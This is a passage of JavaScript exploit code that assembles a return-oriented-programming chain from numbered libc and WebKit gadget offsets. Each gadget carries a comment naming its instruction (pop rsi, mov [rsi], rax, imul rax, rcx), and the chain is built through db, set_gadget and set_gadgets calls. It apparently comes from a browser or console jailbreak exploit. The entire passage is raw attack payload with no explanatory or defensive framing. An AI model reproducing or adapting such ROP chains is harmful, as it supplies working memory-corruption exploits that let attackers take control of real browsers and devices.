//L803:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+96896, //L806
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+96864, //L804
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+96880, //L805
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L804:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L805:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L806:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+96968, //L807
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L807:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+97024, //L810
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L810:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+97104, //L811
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L811:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L812:
db([12, 0]); // 0xc
set_gadget(libc_base+792472,); //pop rcx
//L813:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+97208, //L814
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+97224, //L815
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L814:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L815:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+97312, //L816
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L816:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+97368, //L819
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L819:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+97440, //L820
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L820:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+97496, //L823
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L823:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L824:
libc_base+793877, //pop rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+97648, //L827
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L826:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L827:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+97736, //L828
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+97752, //L830
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L828:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L830:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+97896, //L833
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+97864, //L831
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+97880, //L832
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L831:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L832:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L833:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+97968, //L834
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L834:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+98024, //L837
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L837:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+98104, //L838
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L838:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L839:
db([13, 0]); // 0xd
set_gadget(libc_base+792472,); //pop rcx
//L840:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+98208, //L841
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+98224, //L842
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L841:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L842:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+98312, //L843
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L843:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+98368, //L846
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L846:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+98440, //L847
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L847:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+98496, //L850
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L850:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+98600, //L853
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L852:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L853:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+98688, //L854
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+98704, //L856
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L854:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L856:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+98848, //L859
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+98816, //L857
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+98832, //L858
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L857:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L858:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L859:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+98920, //L860
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L860:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+98976, //L863
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L863:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+99056, //L864
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L864:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L865:
db([5, 0]); // 0x5
set_gadget(libc_base+792472,); //pop rcx
//L866:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+99160, //L867
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+99176, //L868
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L867:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L868:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+99264, //L869
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L869:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+99320, //L872
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L872:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+99440, //L875
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L874:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L875:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+99528, //L876
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+99544, //L878
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L876:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L878:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+99688, //L881
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+99656, //L879
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+99672, //L880
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L879:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L880:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L881:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+99760, //L882
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L882:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+99816, //L885
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L885:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+99896, //L886
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L886:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L887:
db([14, 0]); // 0xe
set_gadget(libc_base+792472,); //pop rcx
//L888:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+100000, //L889
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+100016, //L890
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L889:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L890:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+100104, //L891
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L891:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+100160, //L894
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L894:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+100232, //L895
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L895:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+100288, //L898
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L898:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L899:
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+100440, //L902
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L901:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L902:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+100528, //L903
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+100544, //L905
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L903:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L905:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+100688, //L908
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+100656, //L906
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+100672, //L907
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L906:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L907:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L908:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+100760, //L909
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L909:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+100816, //L912
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L912:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+100896, //L913
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L913:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L914:
db([15, 0]); // 0xf
set_gadget(libc_base+792472,); //pop rcx
//L915:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+101000, //L916
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+101016, //L917
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L916:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L917:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+101104, //L918
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L918:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+101160, //L921
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L921:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+101232, //L922
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L922:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+101288, //L925
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L925:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L926:
libc_base+877877, //mov rax, rdx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+101440, //L929
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L928:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L929:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+101528, //L930
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+101544, //L932
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L930:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L932:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+101688, //L935
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+101656, //L933
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+101672, //L934
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L933:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L934:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L935:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+101760, //L936
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L936:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+101816, //L939
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L939:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+101896, //L940
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L940:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L941:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L942:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+102000, //L943
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+102016, //L944
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L943:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L944:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+102104, //L945
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L945:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+102160, //L948
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L948:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+102232, //L949
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L949:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+102288, //L952
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L952:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L953:
libc_base+793877, //pop rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+102440, //L956
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L955:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L956:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+102528, //L957
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+102544, //L959
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L957:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L959:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+102688, //L962
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+102656, //L960
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+102672, //L961
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L960:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L961:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L962:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+102760, //L963
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L963:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+102816, //L966
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L966:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+102896, //L967
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L967:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L968:
db([17, 0]); // 0x11
set_gadget(libc_base+792472,); //pop rcx
//L969:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
